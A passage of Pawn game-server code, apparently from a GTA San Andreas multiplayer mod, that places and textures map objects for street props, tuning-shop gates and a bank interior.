	tmpobjid = CreateDynamicObject(1846,-2656.591,-52.742,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.608,-55.459,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.621,-58.223,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2654.149,11.161,8.064,90.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.491,11.584,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.484,14.350,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.481,17.135,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.481,27.165,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.481,24.360,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1846,-2656.481,21.640,8.064,90.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2650.078,10.465,8.652,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2647.684,10.542,8.654,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2652.797,-41.479,8.654,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2651.015,-41.463,8.652,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8661,-2640.811,-31.498,-11.925,0.000,90.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8661,-2640.711,-30.413,-11.925,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2644.266,-25.130,8.362,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2644.228,-36.465,8.362,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2644.377,-6.120,8.362,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2644.397,5.358,8.362,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(970,-2653.314,-10.834,8.496,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(970,-2637.027,-10.794,8.496,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(970,-2636.814,-20.499,8.496,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(970,-2653.367,-20.455,8.496,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2643.321,-36.454,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2643.376,-25.146,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2643.461,-6.134,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2643.524,5.405,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2655.197,-12.696,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1280,-2655.097,-18.648,8.362,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2655.329,-15.667,10.557,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2644.005,-22.633,10.557,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2643.922,-38.971,10.557,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2644.015,-8.817,10.557,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1232,-2644.087,7.947,10.557,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(8132,-2634.135,21.439,10.991,0.000,0.000,64.091,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(760,-2635.450,20.266,7.899,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2630.164,14.371,8.966,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2641.417,25.538,8.966,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(638,-2632.223,14.345,8.966,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(638,-2641.558,23.080,8.966,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2641.036,16.203,2.410,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2638.601,13.940,2.202,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(744,-2641.667,12.871,2.620,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(6965,-2640.776,15.495,5.195,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2650.503,14.701,7.729,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2650.125,24.256,7.729,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2630.492,5.496,7.729,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(759,-2630.616,-36.361,7.729,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2667.892,-59.947,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2673.102,-60.003,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2678.333,-59.995,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2683.543,-59.977,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2688.758,-59.949,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2693.589,-59.909,4.604,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.257,-57.246,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.290,-52.043,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.294,-46.810,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.308,-41.612,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.333,-37.592,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.582,7.583,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.606,12.788,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.645,18.016,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.682,23.258,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2696.705,26.447,4.604,0.000,0.000,-90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2694.060,29.084,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2688.815,29.118,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2683.611,29.120,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2678.377,29.169,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2673.170,29.210,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(1408,-2667.960,29.231,4.604,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3785,-2696.755,-18.040,5.071,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3785,-2696.764,-11.108,5.071,0.000,0.000,180.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3463,-2681.561,-49.668,3.302,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3463,-2681.561,-14.236,3.302,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(3463,-2681.561,16.960,3.302,0.000,0.000,90.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2632.008,-4.790,8.652,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	tmpobjid = CreateDynamicObject(640,-2632.052,-26.494,8.652,0.000,0.000,0.000,-1,-1,-1,300.000,300.000);
	// TUNNINGURI
	CreateDynamicObject(971, -2715.9738, 217.9603, 3.8021, 0.00000, 0.00000, -90.00000); // SF - Wheel Arch Angels
	CreateDynamicObject(971, -1935.48157, 239.04761, 33.76325, 0.00000, 0.00000, 0.00000); // SF - TransFender
	CreateDynamicObject(971, 2387.05225, 1043.28174, 10.06653, 0.00000, 0.00000, 0.00000); // LV - TransFender
	CreateDynamicObject(971, 1042.46680, -1026.00427, 31.93635, 0.00000, 0.00000, 0.00000); // LS - TransFender
	CreateDynamicObject(971, 2644.86719, -2039.28308, 11.50120, 0.00000, -90.00000, 0.00000); // LS - Loco Low Co.
	// INTERIOR BANCA
	new stubsredina1 = CreateDynamicObject(18762, 1042.06165, -356.55746, 10.59911,   0.00000, 0.00000, 0.00000);
	new stubsredina2 = CreateDynamicObject(18762, 1054.37671, -356.50143, 10.59911,   0.00000, 0.00000, 0.00000);
	new stubsredina3 = CreateDynamicObject(18762, 1041.10120, -371.77972, 10.59911,   0.00000, 0.00000, 0.00000);
	new stubsredina4 = CreateDynamicObject(18762, 1054.37964, -372.70630, 10.59911,   0.00000, 0.00000, 0.00000);
	new stubsredina5 = CreateDynamicObject(18762, 1048.07813, -365.19415, 10.59911,   0.00000, 0.00000, 0.00000);

	SetDynamicObjectMaterial(stubsredina1, 0, 12937, "sw_oldshack", "stonewall3_la", 0xFFA99D9F);
	SetDynamicObjectMaterial(stubsredina2, 0, 12937, "sw_oldshack", "stonewall3_la", 0xFFA99D9F);
	SetDynamicObjectMaterial(stubsredina3, 0, 12937, "sw_oldshack", "stonewall3_la", 0xFFA99D9F);
	SetDynamicObjectMaterial(stubsredina4, 0, 12937, "sw_oldshack", "stonewall3_la", 0xFFA99D9F);
	SetDynamicObjectMaterial(stubsredina5, 0, 12937, "sw_oldshack", "stonewall3_la", 0xFFA99D9F);

	new societekanap1 = CreateDynamicObject(19089, 1054.91504, -361.26694, 8.24110,   0.00000, 90.00000, 90.00000);
	new societekanap2 = CreateDynamicObject(19089, 1054.89612, -366.46884, 11.71960,   0.00000, 0.00000, 90.00000);
	new societekanap3 = CreateDynamicObject(19089, 1054.85706, -365.50305, 14.15640,   -7.00000, -35.00000, 99.00000);
	new societekanap4 = CreateDynamicObject(19089, 1054.91504, -363.77289, 11.71680,   0.00000, 90.00000, 90.00000);
	new societekanap5 = CreateDynamicObject(19089, 1045.64661, -359.99731, 18.47830,   0.00000, 0.00000, 0.00000);
	new societekanap6 = CreateDynamicObject(19089, 1046.74158, -359.99731, 18.25930,   0.00000, 0.00000, 0.00000);
	new societekanap7 = CreateDynamicObject(19089, 1047.83655, -359.99731, 18.47830,   0.00000, 0.00000, 0.00000);

	SetDynamicObjectMaterial(societekanap1, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap2, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap3, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap4, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap5, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap6, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societekanap7, 0, 2361, "shopping_freezers", "white", 0xFF000000);

	new societesvetlo1 = CreateDynamicObject(2114, 1045.63403, -360.00461, 11.18930,   0.00000, 0.00000, 0.00000);
	new societesvetlo2 = CreateDynamicObject(2114, 1046.72900, -360.00461, 10.97030,   0.00000, 0.00000, 0.00000);
	new societesvetlo3 = CreateDynamicObject(2114, 1047.82397, -360.00461, 11.18930,   0.00000, 0.00000, 0.00000);

	SetDynamicObjectMaterial(societesvetlo1, 0, 10789, "xenon_sfse", "newgrnd1brn_128", 0xFFDCDADA);
	SetDynamicObjectMaterial(societesvetlo2, 0, 10789, "xenon_sfse", "newgrnd1brn_128", 0xFFDCDADA);
	SetDynamicObjectMaterial(societesvetlo3, 0, 10789, "xenon_sfse", "newgrnd1brn_128", 0xFFDCDADA);

	new societesalter1 = CreateDynamicObject(19430, 1044.08472, -360.07800, 8.11270,   90.00000, 90.00000, 0.00000);
	new societesalter2 = CreateDynamicObject(19430, 1048.33154, -360.07800, 8.11270,   90.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(societesalter1, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societesalter2, 0, 4981, "wiresetc2_las", "lasunion7", -1);

	new societesaltercrno1 = CreateDynamicObject(1783, 1049.77515, -359.92499, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno2 = CreateDynamicObject(1783, 1049.12305, -359.92499, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno3 = CreateDynamicObject(1783, 1048.46912, -359.92499, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno4 = CreateDynamicObject(1783, 1047.81506, -359.92499, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno5 = CreateDynamicObject(1783, 1045.58350, -359.91217, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno6 = CreateDynamicObject(1783, 1047.17114, -359.92499, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno7 = CreateDynamicObject(1783, 1044.94006, -359.91220, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno8 = CreateDynamicObject(1783, 1044.31006, -359.91220, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno9 = CreateDynamicObject(1783, 1043.66504, -359.91220, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno10 = CreateDynamicObject(1783, 1043.02002, -359.91220, 8.85950,   0.00000, 0.00000, 0.00000);
	new societesaltercrno11 = CreateDynamicObject(1783, 1042.37500, -359.91220, 8.85950,   0.00000, 0.00000, 0.00000);

	SetDynamicObjectMaterial(societesaltercrno1, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno1, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno1, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno2, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno2, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno2, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno3, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno3, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno3, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno4, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno4, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno4, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno5, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno5, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno5, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno6, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno6, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno6, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno7, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno7, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno7, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno8, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno8, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno8, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno9, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno9, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno9, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno10, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno10, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno10, 2, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno11, 0, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno11, 1, 3922, "bistro", "Marble");
	SetDynamicObjectMaterial(societesaltercrno11, 2, 3922, "bistro", "Marble");

	new societecrvenpod1 = CreateDynamicObject(19450, 1048.20276, -367.60931, 8.15080,   0.00000, 90.00000, 0.00000);
	new societecrvenpod2 = CreateDynamicObject(19450, 1048.20276, -357.98270, 8.15080,   0.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(societecrvenpod1, 0, 18265, "w_town3cs_t", "corugwall_sandy", 0xFFB93131);
	SetDynamicObjectMaterial(societecrvenpod2, 0, 18265, "w_town3cs_t", "corugwall_sandy", 0xFFB93131);

	new societemonitori1 = CreateDynamicObject(2040, 1055.65674, -369.26175, 8.95970,   0.00000, 0.00000, 54.00000);
	new societemonitori2 = CreateDynamicObject(2228, 1055.66907, -369.23462, 8.58360,   0.00000, 0.00000, -35.00000);
	new societemonitori3 = CreateDynamicObject(2040, 1055.58997, -374.16190, 8.95970,   0.00000, 0.00000, 54.00000);
	new societemonitori4 = CreateDynamicObject(2228, 1055.60205, -374.12241, 8.58360,   0.00000, 0.00000, -35.00000);
	new societemonitori5 = CreateDynamicObject(2040, 1043.93665, -359.96771, 8.83800,   0.00000, 0.00000, 90.00000);
	new societemonitori6 = CreateDynamicObject(2228, 1048.50012, -359.92700, 8.52890,   0.00000, 0.00000, 0.00000);
	new societemonitori7 = CreateDynamicObject(2040, 1048.50317, -359.96771, 8.83800,   0.00000, 0.00000, 90.00000);
	new societemonitori8 = CreateDynamicObject(2228, 1043.91760, -359.92700, 8.52890,   0.00000, 0.00000, 0.00000);
	new societemonitori9 = CreateDynamicObject(2269, 1055.39600, -369.65961, 9.12950,   0.00000, 0.00000, -35.00000);
	new societemonitori10 = CreateDynamicObject(2269, 1055.33313, -374.55597, 9.12950,   0.00000, 0.00000, -35.00000);
	new societemonitori11 = CreateDynamicObject(2269, 1048.49695, -360.44409, 9.07660,   0.00000, 0.00000, 0.00000);
	new societemonitori12 = CreateDynamicObject(2269, 1043.93481, -360.44409, 9.07660,   0.00000, 0.00000, 0.00000);
	new societemonitori13 = CreateDynamicObject(2269, 1055.96375, -368.88211, 9.12950,   0.00000, 0.00000, 145.00000);
	new societemonitori14 = CreateDynamicObject(2269, 1055.90210, -373.77161, 9.12950,   0.00000, 0.00000, 145.00000);
	new societemonitori15 = CreateDynamicObject(2269, 1048.51794, -359.46909, 9.07660,   0.00000, 0.00000, 180.00000);
	new societemonitori16 = CreateDynamicObject(2269, 1043.95361, -359.46909, 9.07660,   0.00000, 0.00000, 180.00000);

	SetDynamicObjectMaterial(societemonitori1, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori2, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori3, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori4, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori5, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori6, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori7, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori8, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori9, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori10, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori11, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori12, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori9, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori10, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori11, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori12, 0, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori13, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori14, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori15, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori16, 1, 2361, "shopping_freezers", "white", 0xFF000000);
	SetDynamicObjectMaterial(societemonitori13, 0, 2361, "shopping_freezers", "white", 0xFFA69F9F);
	SetDynamicObjectMaterial(societemonitori14, 0, 2361, "shopping_freezers", "white", 0xFFA69F9F);
	SetDynamicObjectMaterial(societemonitori15, 0, 2361, "shopping_freezers", "white", 0xFFA69F9F);
	SetDynamicObjectMaterial(societemonitori16, 0, 2361, "shopping_freezers", "white", 0xFFA69F9F);

	new societepod1 = CreateDynamicObject(18981, 1051.97681, -368.84698, 7.73670,   0.00000, 90.00000, 0.00000);
	new societepod2 = CreateDynamicObject(18981, 1051.96619, -393.84500, 7.73670,   0.00000, 90.00000, 0.00000);

	SetDynamicObjectMaterial(societepod1, 0, 12954, "sw_furniture", "ws_sheetwood_clean");
	SetDynamicObjectMaterial(societepod2, 0, 12954, "sw_furniture", "ws_sheetwood_clean");

	new societeukras1 = CreateDynamicObject(7017, 1041.53284, -367.32959, 4.53920,   0.00000, 0.00000, 90.00000);
	new societeukras2 = CreateDynamicObject(7017, 1039.75708, -356.95282, 4.53920,   0.00000, 0.00000, 0.00000);
	new societeukras3 = CreateDynamicObject(7017, 1060.60278, -348.64471, 4.53920,   0.00000, 0.00000, 90.00000);

	SetDynamicObjectMaterial(societeukras1, 1, 12954, "sw_furniture", "CJ_WOOD5");
	SetDynamicObjectMaterial(societeukras2, 1, 12954, "sw_furniture", "CJ_WOOD5");
	SetDynamicObjectMaterial(societeukras3, 1, 12954, "sw_furniture", "CJ_WOOD5");

	new societezid1 = CreateDynamicObject(19449, 1054.91882, -371.30240, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid2 = CreateDynamicObject(19449, 1050.18542, -372.31543, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid3 = CreateDynamicObject(19449, 1041.49329, -367.38690, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid4 = CreateDynamicObject(19449, 1040.56799, -372.31540, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid5 = CreateDynamicObject(19449, 1046.20337, -356.90427, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid6 = CreateDynamicObject(19449, 1041.49329, -357.75949, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid7 = CreateDynamicObject(19449, 1055.82007, -356.90430, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid8 = CreateDynamicObject(19449, 1054.91882, -353.45541, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid9 = CreateDynamicObject(19449, 1060.57056, -361.47760, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid10 = CreateDynamicObject(19449, 1060.57056, -371.06161, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid11 = CreateDynamicObject(19449, 1060.57056, -380.67419, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid12 = CreateDynamicObject(19449, 1054.91882, -380.61591, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid13 = CreateDynamicObject(19449, 1064.27161, -379.37656, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid14 = CreateDynamicObject(19387, 1057.85828, -379.37659, 9.97970,   0.00000, 0.00000, 90.00000);
	new societezid15 = CreateDynamicObject(19449, 1051.44641, -379.37659, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid16 = CreateDynamicObject(19449, 1050.17664, -385.41080, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid17 = CreateDynamicObject(19449, 1064.37903, -385.47870, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid18 = CreateDynamicObject(19449, 1054.63232, -390.21582, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid19 = CreateDynamicObject(19449, 1063.91028, -389.55890, 9.98530,   0.00000, 0.00000, 0.00000);
	new societezid20 = CreateDynamicObject(19449, 1059.31006, -393.07748, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid21 = CreateDynamicObject(19449, 1049.93665, -395.01895, 9.98530,   0.00000, 0.00000, 90.00000);
	new societezid22 = CreateDynamicObject(19387, 1057.95801, -385.47870, 9.97970,   0.00000, 0.00000, 90.00000);
	new societezid23 = CreateDynamicObject(19449, 1051.54480, -385.47870, 9.98530,   0.00000, 0.00000, 90.00000);

	SetDynamicObjectMaterial(societezid1, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid2, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid3, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid4, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid5, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid6, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid7, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid8, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid9, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid10, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid11, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid12, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid13, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid14, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid15, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid16, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid17, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid18, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid19, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid20, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid21, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid22, 0, 4981, "wiresetc2_las", "lasunion7", -1);
	SetDynamicObjectMaterial(societezid23, 0, 4981, "wiresetc2_las", "lasunion7", -1);

	new societekrov1 = CreateDynamicObject(18981, 1051.97681, -368.82599, 12.26880,   0.00000, 90.00000, 0.00000);
